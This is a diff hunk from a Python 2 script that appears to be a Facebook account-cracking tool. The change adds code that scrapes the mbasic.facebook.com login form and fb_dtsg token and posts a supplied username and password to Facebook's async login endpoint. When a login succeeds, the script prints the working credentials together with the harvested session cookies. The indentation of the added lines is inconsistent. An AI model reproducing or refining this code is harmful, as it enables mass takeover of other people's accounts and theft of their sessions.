@@ -482,7 +482,23 @@ class ngentod:
             ses = requests.Session()
             ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
             p = ses.get("https://mbasic.facebook.com")
-            b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
+            b = bs4.BeautifulSoup(p.text, 'html.parser')
+            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
+            data = {}
+            for i in b('input'):
+            	if i.get('value') is None:
+            	    if i.get('name') == 'email':
+            	        data.update({"email":user})
+                    elif i.get("name")=="pass":
+                    	data.update({"pass":pw})
+                    else:
+                    	data.update({i.get('name'): ''})
+                else:
+                	data.update({i.get('name'): i.get('value')})
+            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
+            '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
+            ses.headers.update({'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8'})
+            po = ses.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print '\r %s*--> %s ◊ %s ◊ %s  ' % (H,user,pw,kuki)
